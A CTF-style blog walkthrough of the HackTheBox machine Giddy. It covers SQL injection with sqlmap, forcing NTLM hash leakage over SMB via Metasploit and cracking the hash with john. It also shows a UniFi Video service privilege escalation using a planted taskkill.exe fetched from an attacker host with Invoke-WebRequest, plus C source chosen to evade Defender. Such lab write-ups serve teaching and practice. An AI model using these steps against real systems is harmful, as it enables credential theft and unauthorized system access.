---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-02-16-giddy-hackthebox
tags:
- hackthebox
- powershell
- responder
- service
- sql injection
- windows
title: Giddy @ HackTheBox
---

In this post I will give a quick walkthrough on Giddy from [hackthebox.eu](https://www.hackthebox.eu). The machine involves (automated) sql injection, stealing ntlm hashes via sqli and the exploitation of vulnerable service for which a CVE exists.

## User Flag

Scanning the machine with nmap (`nmap -Pn -n -sV -sC 10.10.10.104`) reveals the following services:

```
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_ssl-date: 2018-12-20T19:56:44+00:00; -2h09m16s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2018-12-16T04:10:33
|_Not valid after:  2019-06-17T04:10:33
|_ssl-date: 2018-12-20T19:56:44+00:00; -2h09m16s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

  
On port 80/443 we are presented with an image of a dog in a car, so the first thing to do is to search for actually useful websites in sub folders with dirb (`dirb https://giddy.htb`).

In `/remote` we find a powershell web logon:

![](htb_giddy_ps_login.png)

However trying some standard username password combinations yields no results, so we start looking for other web content. In `/mvc` a new website can be seen:

![](htb_giddy_shop.png)

Clicking on a product leads to the following url: `https://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=18`. Since id fields are often prone to injection vulnerabilities we try to enter a `'` which results in the following error: `[SqlException (0x80131904): Unclosed quotation mark after the character string ''.`. This hints strongly at mssql sql injection, so we can use sqlmap (`sqlmap -u https://giddy.htb/mvc/Product.aspx\?ProductSubCategoryId\=18 --batch --level 5 --risk 3 --table`) to further explore that vector, which leads to a full database dump via union based sql injection. However nothing too interesting can be found in the database and getting a shell via `--os-pwn` or `--ps-shell` fails too.

We can however use the sql injection vector to make a smb request to our attacker box and get the smb authentication (username, domain and ntlmv2-hash) this way.  
An easy way to complish this is to use metasploits `admin/mssql/mssql_ntlm_stealer_sqli` module, which uses the `dir_tree` command of mssql to authenticate via smb. Besides setting `RHOSTS` and `SMBPROXY` it is important to set the `GET_PATH` parameter with a `[SQLi]` string at the point of injection, in this case `/mvc/Product.aspx?ProductSubCategoryId=18;[SQLi]`. Before executing the attack a listener for the smb request should be started. In this case we are using the one from metasploit (`server/capture/smb`), but any other capture tool like for example responder can be used as well.

We receive the following authentication:

```
NTLMv2 Response Captured from 10.10.10.104:49724 - 10.10.10.104
USER:Stacy DOMAIN:GIDDY OS: LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:a64d9f281ab84503c3615f603a3dbea6
NT_CLIENT_CHALLENGE:0101000000000000515eeb0bae98d401446aefd9a9df392c00000000020000000000000000000000
```

The hash can be cracked with john (`john --wordlist=~/rockyou.txt hash`) in seconds and reveals the password of `GIDDY\Stacy` to be `xNnWo6272k7x`. Going back to the powershell webconsole we discovered earlier we can now log into the machine.

![](htb_giddy_ps_login_success.png)## Root Flag

In the user folder of stacy we find a file `univideo` with the content "stopped", which is a bit suspicious. In addition we find the file "C:\\Users\\Stacy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost\_history.txt" which has the following entry:

```
net stop unifivideoservice
$ExecutionContext.SessionState.LanguageMode
Stop-Service -Name Unifivideoservice -Force
Get-Service -Name Unifivideoservice
whoami
Get-Service -ServiceName UniFiVideoService
```

So we learned that this unifivideoservice is installed and can be started and stopped by stacy. Querying the service with `cmd.exe /c 'sc qc Unifivideoservice'` shows that the service indeed exists and runs as `LocalSystem`:

```
TYPE               : 10  WIN32_OWN_PROCESS 
START_TYPE         : 2   AUTO_START
ERROR_CONTROL      : 1   NORMAL
BINARY_PATH_NAME   : C:\ProgramData\unifi-video\avService.exe //RS//UniFiVideoService
LOAD_ORDER_GROUP   : 
TAG                : 0
DISPLAY_NAME       : Ubiquiti UniFi Video
DEPENDENCIES       : Tcpip
                   : Afd
SERVICE_START_NAME : LocalSystem
```

Searching for public exploits points us to `https://www.exploit-db.com/exploits/43390`. From the vulnerability description: "Upon start and stop of the service, it tries to load and execute the file at "C:\\ProgramData\\unifi-video\\taskkill.exe". However this file does not exist inthe application directory by default at all."

This means we can create a custom taskkill.exe at the specified location which will be executed by LocalSystem. Since we are on a windows machine that has possibly windows defender activated, the simplest thing to do here is to create a custom executable that just reads the root.txt and therefore does not trigger any detection.

I’m creating the following program and compile it with mingw (`x86_64-w64-mingw32-gcc read.c -o read.exe`):

```cpp
#include <stdio.h>
#include <stdlib.h>


int main()
{
    FILE *fptr1, *fptr2;
    char *src = "C:\\Users\\Administrator\\Desktop\\root.txt";
    char *dst = "C:\\Users\\Stacy\\Documents\\xct.txt";
    char c;

    fptr1 = fopen(src, "r");
    if (fptr1 == NULL)
    {
        printf("Cannot open file %s \n", src);
        exit(0);
    }

    fptr2 = fopen(dst, "w");
    if (fptr2 == NULL)
    {
        printf("Cannot open file %s \n", dst);
        exit(0);
    }

    c = fgetc(fptr1);
    while (c != EOF)
    {
        fputc(c, fptr2);
        c = fgetc(fptr1);
    }

    printf("\nContents copied to %s", src);
    fclose(fptr1);
    fclose(fptr2);
    return 0;
}
```

The compiled program is put into the correct folder and on restart of the service executed:

```
Invoke-WebRequest "http://x.x.x.x:8000/read.exe" -OutFile "C:\ProgramData\unifi-video\taskkill.exe"
restart-service -name "Unifivideoservice"
```

The root flag is now in `xct.txt` in the Documents folder of stacy and the box therefore finished.